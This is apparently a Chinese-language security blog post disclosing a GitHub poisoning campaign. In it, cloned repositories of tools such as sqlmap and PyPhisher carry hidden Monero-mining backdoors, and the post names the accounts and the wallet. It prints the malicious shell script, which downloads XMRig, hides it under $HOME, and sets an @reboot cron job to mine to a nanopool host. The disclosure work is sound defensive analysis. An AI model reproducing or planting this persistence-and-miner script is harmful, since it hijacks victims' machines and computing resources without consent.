# 【披露】近期github投毒 - 持久化门罗币挖矿后门

## 概述

近期发现多个GitHub账号被用于投毒，暗藏挖矿后门，主要针对门罗币（Monero）。攻击者通过克隆流行的开源项目（如PyPhisher和sqlmap）并在源码中植入恶意挖矿脚本，利用受害者的机器进行持续挖矿。目前已确认至少有17台机器受影响。

这些恶意代码通常通过Shell脚本下载并隐藏到用户目录中，并定期通过cron任务执行，确保挖矿工具在每次系统启动时持续运行。此次活动的时间范围从7月底到8月12日，同时也发现了更早的投毒活动痕迹，涉及多个关联账号，其中一些账号已被删除。

整体来看，此次投毒事件显示了开源平台的安全隐患，以及攻击者对开源项目的不当利用，需要引起开发者和用户的高度重视。

## 前言

本来骑着小电驴去超市买点东西，结果出超市发现下雨了，刚好一道闪电劈到了我正前方，距离不到20米。

没带伞，在超市门口刷了一会微信，有人发了github的链接，于是就看了一下

## 信息

币种：门罗币

账户信息：

	https://xmr.nanopool.org/account/45eUFaFCmq4SHeiGjfkncfVFeGTAFQtZcBY1nbXmPZdcifcBSaAi7FWA4Syf3cnVcHCx96pnXbeVsfZMu1YEuDuA6ymZr6P

目前仍有两台机器正在工作，有17台机器离线

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e914ec511e6f42748463f583530485b8.png)


## 相关github账号

**最初发现的账号**：https://github.com/Pypi-Project

后续发现的具有相同特征的账号

	https://github.com/sqlmapprojec
	https://github.com/niktoproject
	https://github.com/W1hithat（该账号已被删除）

**这些账号的所有项目，已确认：为都携带挖矿脚本后门**

## 涉及挖矿后门的主要的常用渗透工具项目

### PyPhisher

黑客通过clone官方的PyPhisher源码，在源码中添加恶意shell 脚本

	https://github.com/sqlmapprojec/PyPhisher

恶意代码位于PyPhisher.py文件中的**第27行**

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/abc118040d72484f96e30cd1db66b8ce.png)

### sqlmap

同样，黑客通过克隆官方的sqlmap源码，在源码中添加恶意shell脚本

	https://github.com/sqlmapprojec/sqlmap

恶意代码位于sqlmap.py文件中的**第104行**

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/d0405eed496042269e7c600e44e22a92.png)

### CVE-2024-6387

通过克隆@xaitax的[CVE-2024-6387_Check](https://github.com/xaitax/CVE-2024-6387_Check)的源码，在源码中添加恶意shell脚本

	https://github.com/niktoproject/CVE-202406387_Check.py

恶意代码位于CVE-202406387_Check.py文件中的**第60行**

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/5794015d7ac346c7b7966799cf81c2c2.png)

### tools-phishing

通过克隆@AdrMXR的[tools-phishing](https://github.com/AdrMXR/tools-phishing)的源码，在源码中添加恶意shell脚本

	https://github.com/niktoproject/tools-phishing

恶意代码位于tools-phishing.py文件中的**第164行**

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/550e3096c9394fe9b0328c1dd2084a7e.png)

### CVE-2024-27198

通过克隆@Stuub的[CVE-2024-6387_Check](https://github.com/Stuub/RCity-CVE-2024-27198)的源码，在源码中添加恶意shell脚本

	https://github.com/Pypi-Project/RCity-CVE-2024-27198

恶意代码位于RCity.py文件中的**第339行**

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/c8f24a530e914bb989c720dfa49b3e06.png)

## 披露过程

首先通过已发现的恶意代码中，找到它相关联的脚本项目地址

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/94f27b0f882f478f9a8b9cfb3955b3d1.png)

该shell脚本项目在另一个恶意账户`niktoproject`中也存在并且相同。

shell脚本主要内容：

```shell
#!/bin/bash

...

# Descargar xmrig a /tmp
wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz

# Descomprimir xmrig en /tmp
tar -xzvf /tmp/xmrig.tar.gz -C /tmp

mkdir $HOME/.xconfig

# Copiar el minero al directorio oculto
cp /tmp/xmrig-6.21.3/xmrig $HOME/.xconfig/.x

...

# Definir la variable con un valor inicial
billetera="45eUFaFCmq4SHeiGjfkncfVFeGTAFQtZcBY1nbXmPZdcifcBSaAi7FWA4Syf3cnVcHCx96pnXbeVsfZMu1YEuDuA6ymZr6P/"

...

# Agregar tarea de cron
(crontab -l 2>/dev/null; echo "@reboot $HOME/.xconfig/.x -o xmr-us-east1.nanopool.org:14433 -u $billetera$USUARIO --tls --coin monero -B") | crontab -

# Limpiar archivos temporales
rm /tmp/xmrig.tar.gz
rm -rf /tmp/xmrig-6.21.3
$HOME/.xconfig/.x -o xmr-us-east1.nanopool.org:14433 -u $billetera$USUARIO --tls --coin monero -B
```

挖矿工具被锁定为门罗币矿工`XMRig`

黑客首先将xmrig下载到目标机器将其设置为隐藏文件，接着设置cron job定时任务，每次启动都会执行挖矿工具

通过简单的代码特征，github可以直接搜索到相关的项目：

	/c.git'], stdout=subprocess.DEVNULL

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/af8946349677462e8824edabe62773e5.png)

通过门罗币网站，可以直接搜索到该账户的相关信息

	https://xmr.nanopool.org/account/45eUFaFCmq4SHeiGjfkncfVFeGTAFQtZcBY1nbXmPZdcifcBSaAi7FWA4Syf3cnVcHCx96pnXbeVsfZMu1YEuDuA6ymZr6P

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/2ed3c3fef1f54ebfa17065b20a146aee.png)

## 活动时间

通过这些账号的最早投毒项目上传时间以及账号创建时间来看，活动时间是在`7月月底 - 8月12号`

**请注意，这仅是本次活动的时间点，不包含过去事件的活动时间**

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/6d3b1b7df8b94989a9b57a18aa4b8e11.png)

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/d753ca7948944d388296da4e45b565fa.png)

## 早期活动痕迹

根据这些投毒的项目的历史commit来看，可以发现以下信息：

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/c467fac06df444af808cf44780f5f757.png)

我们发现了另一个账户`W1hithat`，但很遗憾该账户已经404

**说明这应该是更早些时活动的账户，当黑客发现账号不再有鱼上钩后便删除了账号，并创建了新的账号**

同时也说明了对方相当马虎，忘记了更换脚本url

## 结束

近期的GitHub投毒事件揭示了开源项目在安全方面的脆弱性。通过植入恶意挖矿代码，攻击者能够利用用户的计算资源进行门罗币挖矿，给受害者带来了隐形的损失。尽管多台机器已经被识别并停止挖矿，但此次事件提醒开发者和用户加强对开源项目的审查，及时发现和修复潜在的安全漏洞。同时，社区应加强合作，提升对恶意行为的防范意识，共同维护开源环境的安全性。